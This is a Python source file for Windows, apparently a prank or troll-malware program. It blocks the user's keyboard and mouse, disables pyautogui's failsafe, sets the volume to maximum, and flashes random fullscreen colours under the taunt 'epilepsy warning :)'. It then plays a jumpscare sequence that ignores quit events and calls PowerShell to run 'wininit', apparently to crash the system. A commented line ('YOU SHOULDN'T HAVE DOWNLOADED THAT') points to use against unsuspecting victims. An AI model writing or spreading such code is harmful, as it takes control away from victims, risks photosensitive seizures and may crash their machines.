import tkinter
import tkinter.messagebox
import ctypes
import pyautogui
import sys
import threading
import gif_pygame
import playsound
import threading
import pygame
from ctypes import wintypes, cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from time import sleep
import random
import os
import subprocess


from os import path 
bundle_dir = path.abspath(path.dirname(__file__)) 

BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL
BlockInput(True)

pygame.init()

MUSIC = path.join(bundle_dir, 'salinewin.wav')
screen = pygame.display.set_mode((1920,1200))
pygame.display.toggle_fullscreen()
pygame.mixer_music.load(MUSIC)
font = pygame.font.Font("zhcn.ttf",140)
pygame.mixer.init()
pyautogui.FAILSAFE= False
screen.fill((0,0,0))
txt = font.render("epilepsy warning :)",True,(50,50,50))
textRect = txt.get_rect()

textRect.center = (1920 // 2, 1200 // 2)
screen.blit(txt,textRect)
pygame.display.update()     
sleep(1)

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None)
volume = cast(interface,POINTER(IAudioEndpointVolume))
volume.SetMasterVolumeLevel(0.0,None)
pygame.mixer_music.play()
clock = pygame.time.Clock()


while True:
    
    if pygame.mixer_music.get_busy() == False:
        break
    events = pygame.event.get()
    for e in events:
        if e == pygame.QUIT:

            break
    screen.fill((random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    txt = font.render("epilepsy warning :)",True,(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    textRect = txt.get_rect()

 
    textRect.center = (random.randint(750,1170),random.randint(390,810))
    screen.blit(txt,textRect)
    pygame.display.update()
    
    clock.tick(30)

pygame.quit()
pygame.mixer.init()
#next part: dialog boxes
pyautogui.moveTo(1200,600)
pyautogui.leftClick(1200,600)
sleep(1)
#pyautogui.typewrite("""YOU SHOULDN'T HAVE DOWNLOADED THAT.
#Now look what you've done...
#I see EVERYTHING.
#Every move, every click... I'm watching.
#Don't try to escape. It's far too late now.
#- Your new 'friend'""",interval=0.1)
ans = tkinter.messagebox.askyesno("ņ̴̍ó̶̼̪̮-̵̝̾̌̚è̷̥̬̗s̴̜̫̾͋͠c̴̜̒a̷͈̱̱̽̒̐p̵̡̼̌̎͜ê̵̜̐","have you learned your lesson?")

if ans:
    subprocess.call(["powershell","-Command","wininit"])

import pygame
from time import sleep
import random
import gif_pygame
import pyautogui
import subprocess
pygame.init()
clock = pygame.time.Clock()


pygame.mixer.Sound(path.join(bundle_dir, 'thenyouwilldie.mp3')).play()
sleep(4.4)
#pyautogui.hotkey('winleft','d')
screen = pygame.display.set_mode([1920,1200])
freddy = pygame.image.load(path.join(bundle_dir, 'freddy-left.png')).convert()
state = 0
aggr = 0
blackout = False

pygame.mixer_music.load(path.join(bundle_dir, 'freddy.mp3'))
pygame.mixer_music.set_volume(0.1)
pygame.mixer_music.play()
footstep = pygame.mixer.Sound(path.join(bundle_dir, 'footstep.wav'))
jumpscare = gif_pygame.load(path.join(bundle_dir, 'jumpscare.gif'))
jumpscare_time = 0
scream = pygame.mixer.Sound(path.join(bundle_dir, 'jumpscare.mp3'))
pygame.mouse.set_visible(False)
pyautogui.leftClick(800,700)
while True:
    for event in pygame.event.get():
        if event == pygame.QUIT:
            pass
    if aggr > 2400 and random.randint(1,400) == 1:
        pygame.mixer_music.stop()
        screen.fill((0,0,0))
        pygame.display.update()
        aggr = 0
        blackout = True
    if blackout:
        if random.randint(1,1200) == 1 and jumpscare_time == 0 and aggr > 600:
            jumpscare_time += 1
            scream.set_volume(1.0)
            scream.play()
            continue
        if jumpscare_time >=87:
            break
        if jumpscare_time > 0:
            screen.fill((0,0,0))
            jumpscare.render(screen,(0,0))
            jumpscare_time+=1

        if random.randint(1,150) == 1 and not pygame.mixer.get_busy() and jumpscare_time == 0:
            val = random.randint(4,8)/10

            channel = pygame.mixer.find_channel()
            if random.randint(1,2):
                channel.set_volume(val,1-val)
            else:
                channel.set_volume(1-val,val)
            channel.play(footstep)
        
        pygame.display.update()
        aggr += 1
        clock.tick(120)
        continue
    freddy.set_alpha(random.randint(1,20)+aggr/50)
    screen.fill((0,0,0))
    if random.randint(1,1) == 1 and aggr > 840:
        screen.blit(freddy,(0,0))
    ##if random.randint(1,200) == 1 and aggr > 840:
    #    freddy = pygame.image.load(random.choice(["freddy-left.png"])).convert()

    pygame.display.update()
    aggr += 1
    if random.randint(1,120) and aggr>420:
        pygame.mixer_music.set_volume(pygame.mixer_music.get_volume()+0.5)
    clock.tick(120)
pygame.quit()
subprocess.call(["powershell","-Command","wininit"])